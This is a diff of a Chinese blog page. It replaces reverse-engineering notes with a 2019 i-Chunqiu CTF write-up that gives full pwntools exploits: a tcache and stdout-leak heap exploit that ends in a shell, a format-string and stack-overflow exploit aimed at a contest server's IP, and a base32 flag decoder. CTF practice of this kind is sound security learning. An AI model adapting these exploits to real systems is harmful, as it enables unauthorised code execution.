@@ -4,12 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="32位逆向分析技术, 时钟">
-    <meta name="description" content="汇编指令
-ret n : 在ret指令后给栈指针加上操作数
-test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 
-lea ：加载有效地址
-sar : 有符号数右位移指令，这个是算术右位移，补全">
+    <meta name="keywords" content="2019I春秋答题赛, 时钟">
+    <meta name="description" content="PWN2做出来了两个pwn题目（其中一个是复现出来的。。。。）：首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +13,7 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>32位逆向分析技术 | 时钟</title>
+    <title>2019I春秋答题赛 | 时钟</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -249,7 +245,7 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        32位逆向分析技术
+                        2019I春秋答题赛
                     </div>
                 </div>
             </div>
@@ -360,8 +356,8 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/reserve/" target="_blank">
-                                <span class="chip bg-color">reserve</span>
+                            <a href="/tags/pwn-reserve/" target="_blank">
+                                <span class="chip bg-color">pwn reserve</span>
                             </a>
                         
                     </div>
@@ -372,8 +368,8 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/加密与解密/" class="post-category" target="_blank">
-                                加密与解密
+                            <a href="/categories/CTF题解/" class="post-category" target="_blank">
+                                CTF题解
                             </a>
                         
                     </div>
@@ -384,21 +380,21 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-17
+                    2019-11-05
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.1k
+                        1.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        6 分
                     </div>
                     
                 
@@ -414,68 +410,131 @@ sar : 有符号数右位移指令，这个是算术右位移，补全">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h4><ul>
-<li>ret n : 在ret指令后给栈指针加上操作数</li>
-<li>test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 </li>
-<li>lea ：加载有效地址</li>
-<li>sar : 有符号数右位移指令，这个是算术右位移，补全时用的最高位</li>
-<li>shr : 无符号数右位移指令，这个是逻辑右位移，补全时用0</li>
-<li>shl : 左位移指令，操作数的最高位进入标志位CF,最低位补零</li>
-<li>cdq ：这个一般就是用在除法之前，然后作用就是把32位数字扩展成为64位数字，方法就是把eax的最高位全复制到edx中的每一位，进而形成一个64位数据</li>
-</ul>
-<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p><strong>局部变量</strong></p>
-<ol>
-<li>利用栈存放局部变量， 寻找变量：[ebp-xxx]  ，参数调用： [ebp+xxx] ，编译器也可以用 “push reg” 取代指令 “sub esp ,4” 来节省几个字节的空间，”pop ecx”之类的指令也有压缩栈空间的作用，另外局部变量的起始值是随机的，是其他函数执行后留在栈中的垃圾数据。</li>
-<li>还可以利用寄存器来存放局部变量，除了栈占用的2个寄存器，编译器会利用剩下的6个通用寄存器尽可能有效的存放局部变量。</li>
-</ol>
-<p><strong>全局变量</strong></p>
-<ul>
-<li>全局变量通常位于.data段，程序访问全局变量一般会用一个固定的硬编码的地址进行寻址，如果放到了只读段则说明它是一个常量。</li>
-</ul>
-<p><strong>结构体和数组</strong></p>
-<ul>
-<li>其寻址方式一般是[基地址+n] 例如：mov eax, [407030h(基地址) + eax(偏移)]</li>
-</ul>
-<p><strong>虚函数</strong></p>
-<ul>
-<li>待学</li>
-</ul>
-<p><strong>控制语句</strong></p>
-<ul>
-<li>switch case : 跟if else 语句类似，但是如果case 的取值表示一个算术级数，那么编译器会利用一个跳转表来实现。此时jmp dword ptr [4*eax + 004010b0] 指令相当于switch(a) ，根据eax的值进行索引</li>
-</ul>
-<p><strong>转移指令</strong></p>
-<ul>
-<li>短转移：有条件和无条件跳转机器码均为2字节，转移的范围是-128-127字节</li>
-<li>长转移：有条件转移6字节，两字节表示转移类型（je,jg,jns）,四字节表示转移偏移量。无条件转移5字节，因为jmp只需要一个字节，四字节表示偏移即可</li>
-<li>子程序调用(call) : 一类是平常的，类似长转移，一种是调用的参数涉及寄存器，栈等值。例如：”call dword ptr [eax+2]”</li>
-<li>位移量 = 目的地址 - 起始地址 - 跳转指令本身的长度</li>
-</ul>
-<h4 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h4><ul>
-<li>整数加减法:<br>一般情况下就是add sub这些，但是因为编译优化的存在，这些明显的指令会被替换，lea指令允许用户在一个时钟内完成c = a + b + 78h的计算，其中a b c都是在有寄存器的情况下有效，会编译成lea c,[a+b+78h],这种技巧可以使多个变量的求和在一个指令周期内完成，同时可以通过任何寄存器返回结果。例如： lea eax,[eax+ecx+78h] （78h不是固定的,只是表明可以是立即数）</li>
-<li>整数乘法<br>这一般就是mul和imul了，但是优化会进行改变，如果乘2的次幂较大可能用shl左移指令，同时也可能会用lea指令，类似于上面的加法。</li>
-<li>整数的除法<br>这个一般是div,idiv,除法代价高，大概需要比乘法运算多消耗十倍的CPU时钟，这个的替换类似于乘法，也是当除数是2的幂 的话，无符号尽量用shr,有符号尽量用sar，同时优化的时候尽量会把除法替换成乘法一般就是倒数相乘a/b=a*(1/b)</li>
-</ul>
-<h4 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h4><ul>
-<li>字符串大小写转换:<br>大写字母 41h - 5Ah 小写字母 61h - 7Ah 它们之间的转换方式就是原来ASCII的值+/- 20h<br>还有一种大小写转化方法是基于位操作，我们可以发现二进制表示的时候大写字母A的第五位是0，而小写a的第五位是1，其他可以类推，所以就有以下方式<pre><code>Main    proc near
-         lea bx, title+!
-         mov cx,31
-B20:
-          mov ah,[bx]
-          cmp ah,61h
-          jb B30
-          cmp ah,7Ah
-          ja B30
-          and ah ,1101 1111b  ;and 将ah的第五位指令置0(11011111b = DFh)
-          mov [bx],ah
-B30:
-          inc bx
-          loop B20
-          ret
-Main    endp
-</code></pre></li>
-</ul>
+                <h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>做出来了两个pwn题目（其中一个是复现出来的。。。。）：<br>首先说一个pwn2，这个题目真是让我张了不少知识，不仅理解了tcache和unsorted bin attack还学会怎么patch elf文件的libc和ld链接器，同时学了一波文件的_IO_stdout_，下面贴一个“改革春风吹满地”大佬写的exp</p>
+<pre><code>#coding=utf-8
+from pwn import *
+local = 1
+exec_file=&quot;./easy_heap&quot;
+context.binary=exec_file
+context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf=ELF(exec_file,checksec = False)
+if local :
+    argv=[&quot;/glibc/x64/2.27/lib/ld-2.27.so&quot;,&quot;--library-path&quot;,&quot;/glibc/x64/2.27/lib/&quot;,&quot;./easy_heap&quot;]
+    a=process(argv=argv)
+    libc=ELF(&quot;/glibc/x64/2.27/lib/libc.so.6&quot;)
+else:
+    a=remote(&quot;&quot;)
 
+
+def get_base(a):
+    text_base = a.libs()[a._cwd+a.argv[0].strip(&#39;.&#39;)]
+    for key in a.libs():
+        if &quot;libc.so.6&quot; in key:
+            return text_base,a.libs()[key]
+def debug():
+    #text_base,libc_base=get_base(a)
+    #script=&quot;set $text_base=&quot;+str(text_base)+&#39;\n&#39;+&quot;set $libc_base=&quot;+str(libc_base)+&#39;\n&#39;
+    script=&#39;&#39;&#39;
+    b *(0x7ffff7bd5000+0x0000000000009E2)
+    b *(0x7ffff7bd5000+0x00000000000009FE)
+    &#39;&#39;&#39;
+    gdb.attach(a,script)
+def fuck(address):
+    n = globals()
+    for key,value in n.items():
+        if value == address:
+            return success(key+&quot;  ==&gt;  &quot;+hex(address))
+def menu(idx,flag=True):
+    if flag:
+        a.sendlineafter(&quot;2. free\n&quot;,str(idx))
+    else:
+        a.sendlineafter(&quot;2. free&quot;,str(idx))
+def add(content,flag=True):
+    menu(1,flag)
+    if flag:
+        a.sendafter(&quot;content:\n&quot;,content)
+    else:
+        a.sendafter(&quot;content:&quot;,content)
+
+
+def delete(idx,flag=True):
+    menu(2,flag)
+    if flag:
+        a.sendlineafter(&quot;\n&quot;,str(idx))
+    else:
+        a.sendlineafter(&quot;:&quot;,str(idx))
+add(p64(0x91)+p64(0x91))#0 90是为了之后进入unsortbin
+add(p64(0x21)*6)#1
+add(p64(0x21)*6)#2
+delete(0)
+delete(0)
+delete(0)
+add(&#39;\x70&#39;)#3 //修改最低字节这时候tcache的最后一个被改成0x70结尾
+add(&#39;A&#39;)#4 拿出一个
+add(&#39;A&#39;)#5 get fake chunk 拿到目标
+for i in range(8):  #多次free进入unsortedbin拿到arean地址
+    delete(5)
+add(&#39;\x60\x07\xbd&#39;)#6 地址修改到stdout
+delete(3)
+delete(3)
+delete(3)
+delete(3)
+add(&#39;\x70&#39;)#7
+add(&#39;\x70&#39;)#8
+add(&#39;/bin/sh\x00&#39;)#9
+add(p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;)#10
+a.recvuntil(p64(0xfbad1800))
+a.recvuntil(&quot;\x7f&quot;)
+libc_base=u64(a.recvuntil(&quot;\x7f&quot;)[-6:]+&#39;\x00\x00&#39;)-131-libc.symbols[&quot;_IO_2_1_stdout_&quot;]
+fuck(libc_base)
+delete(7,False)
+delete(7,False)
+add(p64(libc_base+libc.symbols[&quot;__free_hook&quot;]-8),False)#11
+add(&#39;A&#39;,False)
+add(&quot;/bin/sh\x00&quot;+p64(libc_base+libc.symbols[&quot;system&quot;]),False)
+delete(9,False)
+a.interactive()
+</code></pre><h3 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h3><p>还有就是一个栈的题目了，这个题目跟平常哪个格式化字符和栈溢出有所不同，因为它限制了格式化可以打印出的栈里面的数据，本来还有点没头绪，但是得大哥指点，64位的机子上寄存器里面还有很多参数呢，乌拉，果真在寄存器里面泄露出来了一个真实地址哦，真实顶哦：</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import *
+context.log_level = &#39;debug&#39;
+
+r = remote(&#39;120.55.43.255&#39;,30022 )
+#r = process(&#39;./easy&#39;)
+libc = ELF(&#39;libc-2.23.so&#39;)
+r.recvuntil(&#39;Input your name:\n&#39;)
+one_gadget_offset = 0x4526a
+payload1 = &#39;%7$p&#39; #7
+payload3 = &#39;%3$p&#39; #7
+r.send(payload1)
+canary = int(r.recv()[0:18],16)
+print &#39;canary = &#39; + hex(canary)
+#r.recvuntil(&#39;note:\n&#39;)
+payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39;*8 + &#39;\x30\x4a&#39;
+
+r.send(payload2)
+r.recvuntil(&#39;Input your name:\n&#39;)
+#gdb.attach(r)
+r.send(payload3)
+ret_1 = int(r.recv()[0:14],16) - 0xf7260
+#raw_input(&#39;@:&#39;)
+print &#39;addr = &#39; + hex(ret_1)
+system_addr = ret_1 + one_gadget_offset
+r.recvuntil(&#39;Input the note:\n&#39;)
+print &#39;system_addr = &#39; + hex(system_addr)
+payload2 = &#39;a&#39; * 8 + p64(canary) + &#39;b&#39; * 8 + p64(system_addr)
+r.sendline(payload2)
+r.interactive()
+</code></pre><h3 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h3><p>这个就比较简单了，主要的难点可能就是一个苹果系统的文件，如果你没有mac,或者没有黑苹果的话，就没法子动态调试，不过base32还是比较容易看出的吧，然后在有一个简单的加密就可了。</p>
+<pre><code>key = [1,2,3,1,4,5,6,7,8,9,10,11,12,13,14,6,15,16,5,17,4,15,10,24,15,18,11,19,20,6,5,1,13,18,17,12,5,10,13,1,44,17,3,13,5,52,4,13,17,21,43,11]
+flag = {1:&#39;G&#39;,2:&#39;5&#39;,3:&#39;S&#39;,4:&#39;I&#39;,5:&#39;Z&#39;,6:&#39;B&#39;,7:&#39;V&#39;,8:&#39;H&#39;,9:&#39;F&#39;,10:&#39;R&#39;,11:&#39;T&#39;,12:&#39;E&#39;,13:&#39;Y&#39;,14:&#39;L&#39;,15:&#39;M&#39;,16:&#39;U&#39;,17:&#39;D&#39;,18:&#39;4&#39;,19:&#39;Q&#39;,20:&#39;O&#39;,21:&#39;C&#39;,22:&#39;G5&#39;,23:&#39;5S&#39;,24:&#39;SG&#39;,25:&#39;GI&#39;,26:&#39;IZ&#39;,27:&#39;ZB&#39;,28:&#39;BV&#39;,29:&#39;VH&#39;,30:&#39;HF&#39;,31:&#39;FR&#39;,32:&#39;RT&#39;,33:&#39;TE&#39;,34:&#39;EY&#39;,35:&#39;YL&#39;,36:&#39;LB&#39;,37:&#39;BM&#39;,38:&#39;MU&#39;,39:&#39;UZ&#39;,40:&#39;ZD&#39;,41:&#39;DI&#39;,42:&#39;IM&#39;,43:&#39;MR&#39;,44:&#39;RS&#39;,45:&#39;SGM&#39;,46:&#39;M4&#39;,47:&#39;4T&#39;,48:&#39;TQ&#39;,49:&#39;QO&#39;,50:&#39;OB&#39;,51:&#39;BZ&#39;,52:&#39;ZG&#39;,53:&#39;GY&#39;,54:&#39;Y4&#39;,55:&#39;4D&#39;,56:&#39;DE&#39;,57:&#39;EZ&#39;,58:&#39;ZR&#39;,59:&#39;RY&#39;,60:&#39;YG&#39;,61:&#39;GR&#39;,62:&#39;RSD&#39;,63:&#39;DS&#39;,64:&#39;SY&#39;,65:&#39;YZ&#39;,66:&#39;ZZ&#39;,67:&#39;ZGI&#39;,68:&#39;IY&#39;,69:&#39;YD&#39;,70:&#39;DC&#39;,71:&#39;CM&#39;,72:&#39;MRT&#39;}
+s = &#39;&#39;
+for i in key:
+    s += flag[i]
+import base64
+print base64.b32decode(s)
+</code></pre>
             </div>
             <hr>
 
@@ -506,9 +565,9 @@ Main    endp
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《32位逆向分析技术》
+                    《2019I春秋答题赛》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/05/2019i-chun-qiu-da-ti-sai/" property="cc:attributionName" rel="cc:attributionURL">
                 时钟
             </a> 采用
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
@@ -549,7 +608,8 @@ Main    endp
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/11/05/2019i-chun-qiu-da-ti-sai/">
                     <div class="card-image">
@@ -567,9 +627,9 @@ Main    endp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -582,6 +642,7 @@ Main    endp
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -600,19 +661,23 @@ Main    endp
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/17/hui-bian-zhi-shi-dian/">
+                <a href="/2019/09/17/32-wei-ni-xiang-fen-xi-ji-zhu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="汇编知识点">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="32位逆向分析技术">
                         
-                        <span class="card-title">汇编知识点</span>
+                        <span class="card-title">32位逆向分析技术</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            汇编中补码转换1.补码可以先减1，然后按位取反。2.从右往左遇见第一个1不变，然后向左按位取反（符号位除外）3.对于16进制数 ：取反的方法就是用15减去改数字中的每一位 ：6A3D –&gt; 95C2+1 –&gt; 95C3 （这只是
+                            汇编指令
+ret n : 在ret指令后给栈指针加上操作数
+test eax,eax 如果eax的值为0，那么逻辑与的运算结果为0，设置ZF为1，否则ZF为0 
+lea ：加载有效地址
+sar : 有符号数右位移指令，这个是算术右位移，补全
                         
                     </div>
                     <div class="publish-info">
@@ -623,8 +688,8 @@ Main    endp
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/编程语言/" class="post-category" target="_blank">
-                                    编程语言
+                            <a href="/categories/加密与解密/" class="post-category" target="_blank">
+                                    加密与解密
                                 </a>
                             
                             
@@ -634,8 +699,8 @@ Main    endp
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/汇编语言/" target="_blank">
-                        <span class="chip bg-color">汇编语言</span>
+                    <a href="/tags/reserve/" target="_blank">
+                        <span class="chip bg-color">reserve</span>
                     </a>
                     
                 </div>
